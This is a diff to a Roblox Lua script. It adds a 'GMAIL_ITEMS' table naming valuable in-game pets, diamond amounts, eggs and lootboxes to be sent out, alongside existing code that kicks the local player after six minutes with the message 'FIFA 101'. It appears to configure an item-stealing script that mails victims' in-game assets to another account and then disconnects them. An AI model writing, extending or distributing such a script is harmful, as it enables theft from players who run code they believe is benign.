@@ -106,7 +106,32 @@ end
 	end
 ----------------------------------------------------------------------------------------
 
+getgenv().GMAIL_ITEMS = {	
 
+["Secret pet1"] = {Class = "Pet", Id = "Rainbow Swirl", MinAmount = 1, AllVariants = true},
+["Secret pet2"] = {Class = "Pet", Id = "Banana", MinAmount = 1, AllVariants = true},
+["Secret pet3"] = {Class = "Pet", Id = "Coin", MinAmount = 1, AllVariants = true},
+["Secret pet4"] = {Class = "Pet", Id = "Yellow Lucky Block", MinAmount = 1, AllVariants = true},	
+["Secret pet5"] = {Class = "Pet", Id = "Crown", MinAmount = 1, AllVariants = true},	
+
+["Send Diamonds"] = {Class = "Currency", Id = "Diamonds", KeepAmount = "50m", MinAmount = "150m"},
+["Deep Sea Treasure Chest"] = {Class = "Lootbox", Id= "Deep Sea Treasure Chest", MinAmount = 5},
+["Diamond Plant Seed"] = {Class = "Seed", Id= "Diamond", MinAmount = 10000},
+["Insta Plant Capsule"] = {Class = "Misc", Id= "Insta Plant Capsule", MinAmount = 1000},
+
+
+["Exclusive Egg 62"] = {Class = "Egg", Id= "Exclusive Egg 62", MinAmount = 1},
+["Exclusive Egg 60"] = {Class = "Egg", Id= "Exclusive Egg 60", MinAmount = 1},
+["Magic Shard"] = {Class = "Misc", Id= "Magic Shard", MinAmount = 20},
+["Bucket O' Magic"] = {Class = "Misc", Id= "Bucket O' Magic", MinAmount = 20},
+["Magic Orb"] = {Class = "Enchant", Id = "Magic Orb", MinAmount = 5,keepAmount = 4},
+["Ghostly Pack"] = {Class = "Lootbox", Id = "Ghostly Pack", MinAmount = 1},
+
+["Exclusive Raffle Ticket"] = {Class = "Misc", Id = "Exclusive Raffle Ticket", MinAmount = 1},
+["Backrooms Luck Booster"] = {Class = "Consumable", Id = "Backrooms Luck Booster",MinAmount = 1},
+["Backrooms Teleport Booster"] = {Class = "Consumable", Id = "Backrooms Teleport Booster",MinAmount = 1},
+
+}
 
 ----------------------------------------------------------------------------------------
 if getgenv().STATUS_disabble_SEND_ALL == true then
@@ -125,3 +150,5 @@ task.wait(360)
 		game.Players.LocalPlayer:Kick("FIFA 101") 
 	end
 end)
+
+
